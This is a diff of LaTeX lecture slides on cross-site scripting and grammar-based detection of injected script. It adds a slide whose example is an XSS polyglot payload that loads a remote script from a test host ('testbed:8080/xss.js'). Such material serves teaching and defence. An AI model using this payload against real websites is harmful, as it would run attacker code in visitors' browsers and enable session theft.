@@ -15,7 +15,10 @@
     \item mark where user input is in that grammar
     \item try to solve if way for context-free grammar to include script tag, etc. with user input
     \end{itemize}
-\includegraphics[width=\textwidth]{wassermann-fig1-2}
+\end{frame}
+
+\begin{frame}
+\includegraphics[width=\textwidth]{../web/wassermann-fig1-2}
 \end{frame}
 
 \begin{frame}{dangerous inputs}
@@ -46,9 +49,17 @@ if (x == "USER INPUT") {
 \end{Verbatim}
 \end{frame}
 
-\begin{frame}[fragile]{dangerous inputs: filtering}
+\begin{frame}{a recent paper}
+\includegraphics[width=\textwidth]{../web/kirchner-title}
 \end{frame}
 
-\begin{frame}{a recent paper}
-\includegraphics[width=\textwidth]{kirchner-title}
+\begin{frame}[fragile]{example input}
+(with added newlines)
+\begin{Verbatim}
+jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=
+import('http://testbed:8080/xss.js') )//%0D%0A
+%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>
+\x3csVg/
+<sVg/oNloAd=import('http://testbed:8080/xss.js')//>\x3e
+\end{Verbatim}
 \end{frame}
